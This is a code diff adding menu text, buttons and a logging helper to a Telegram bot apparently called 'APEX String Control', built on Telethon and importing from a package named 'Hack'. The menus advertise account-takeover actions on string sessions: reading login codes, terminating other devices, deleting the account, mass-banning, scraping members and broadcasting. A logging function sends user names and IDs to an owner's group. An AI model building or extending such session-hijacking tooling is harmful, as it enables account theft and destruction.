@@ -355,3 +355,118 @@ START_BUTTON = [
     [_btn("🔐 Vault","VAULT",_P), _btn("📊 Account","ACCOUNT",_P)],
     [_btn("📖 Help","HELP",_S), _btn("📡 Status","STATUS",_S)],
 ]
+
+# ===== APEX FINAL UI OVERRIDE =====
+import logging as _lg
+from datetime import datetime as _dt
+from telethon.tl.custom import Button as _Button
+
+_ULOG = _lg.getLogger(__name__)
+
+P = "primary"
+D = "danger"
+S = "success"
+_P, _D, _S = P, D, S
+
+def btn(text, data, style=None):
+    try:
+        if style:
+            return _Button.inline(text, data=data, style=style)
+        return _Button.inline(text, data=data)
+    except Exception as e:
+        _ULOG.warning("btn fallback: %s", e)
+        return _Button.inline(text, data=data)
+
+_btn = btn
+
+DIV = "━━━━━━━━━━━━━━━"
+
+START_TEXT = (
+    "<b>🛡️ APEX STRING CONTROL</b>\n"
+    "<i>Secure · Fast · Reliable</i>\n\n"
+    "<b>Your Telegram session cockpit.</b>\n"
+    "Create, inspect and revoke Pyrogram & Telethon sessions — with bank-grade hygiene.\n\n"
+    f"{DIV}\n"
+    "<b>⚡ What you can do</b>\n"
+    "• Generate a string session\n"
+    "• Check 2FA and account info\n"
+    "• Revoke every other device\n"
+    "• Manage groups and channels\n"
+    f"{DIV}\n\n"
+    "<i>Tap a module below to begin.</i>"
+)
+
+def start_buttons(is_owner=False):
+    rows = [
+        [btn("🔐 Session Vault", "VAULT", P), btn("👤 My Account", "ACCOUNT", P)],
+        [btn("📖 Help", "HELP", S), btn("📡 Bot Status", "STATUS", S)],
+    ]
+    if is_owner:
+        rows.append([btn("👑 Owner Panel", "OP_OPEN", D)])
+    return rows
+
+START_BUTTON = start_buttons(False)
+
+MENU1 = (
+    "<b>🔐 SESSION VAULT — Part 1</b>\n"
+    "<i>Account & chat tools</i>\n\n"
+    f"{DIV}\n"
+    "<b>A</b> 📢 Channels — list every channel you own\n"
+    "<b>B</b> 👤 Account — ID, name, phone, DC\n"
+    "<b>C</b> 🚫 Ban all — ban every member in a group\n"
+    "<b>D</b> 🔍 OTP finder — read recent login codes\n"
+    "<b>E</b> ➕ Join — join a group or channel\n"
+    "<b>F</b> ➖ Leave — leave a group or channel\n"
+    "<b>G</b> 🗑 Delete — delete a group or channel you own\n"
+    "<b>H</b> 🔐 2FA — check if two-step is enabled\n"
+    f"{DIV}\n"
+    "<i>Tap A–H below · Next for part 2</i>"
+)
+
+MENU2 = (
+    "<b>🔐 SESSION VAULT — Part 2</b>\n"
+    "<i>Sessions & admin tools</i>\n\n"
+    f"{DIV}\n"
+    "<b>I</b> 🛑 Terminate — kill every other session\n"
+    "<b>J</b> ⚠️ Delete account — permanent, cannot undo\n"
+    "<b>K</b> 🚪 Leave all — leave every chat\n"
+    "<b>L</b> 📨 Broadcast — message all your chats\n"
+    "<b>M</b> 🔓 Logout — end this session\n"
+    "<b>N</b> 🧲 Scrap — export members and invite\n"
+    "<b>O</b> ⬇️ Demote — remove admin rights\n"
+    "<b>P</b> ⬆️ Promote — grant admin rights\n"
+    f"{DIV}\n"
+    "<i>Tap I–P below · Back for part 1</i>"
+)
+
+KEYBOARD1 = [
+    [btn("A", "A", P), btn("B", "B", P), btn("C", "C", D), btn("D", "D", P)],
+    [btn("E", "E", P), btn("F", "F", P), btn("G", "G", D), btn("H", "H", S)],
+    [btn("▶ Next", "next", S)],
+]
+KEYBOARD2 = [
+    [btn("I", "I", D), btn("J", "J", D), btn("K", "K", D), btn("L", "L", P)],
+    [btn("M", "M", D), btn("N", "N", P), btn("O", "O", S), btn("P", "P", S)],
+    [btn("◀ Back", "back", S)],
+]
+
+async def log_deep(title, user, extra=""):
+    try:
+        import env
+        from Hack import bot
+        if not env.LOG_GROUP_ID:
+            return
+        name = getattr(user, "first_name", None) or "—"
+        uname = getattr(user, "username", None)
+        ts = _dt.now().strftime("%Y-%m-%d %H:%M:%S")
+        body = f"<b>{title}</b>\n\n"
+        body += f"<b>👤 Name:</b> {name}\n"
+        body += f"<b>🆔 ID:</b> <code>{user.id}</code>\n"
+        if uname:
+            body += f"<b>🔗 Username:</b> @{uname}\n"
+        body += f"<b>🕐 Time:</b> <code>{ts}</code>\n"
+        if extra:
+            body += "\n" + extra
+        await bot.send_message(env.LOG_GROUP_ID, body, parse_mode="html")
+    except Exception:
+        pass
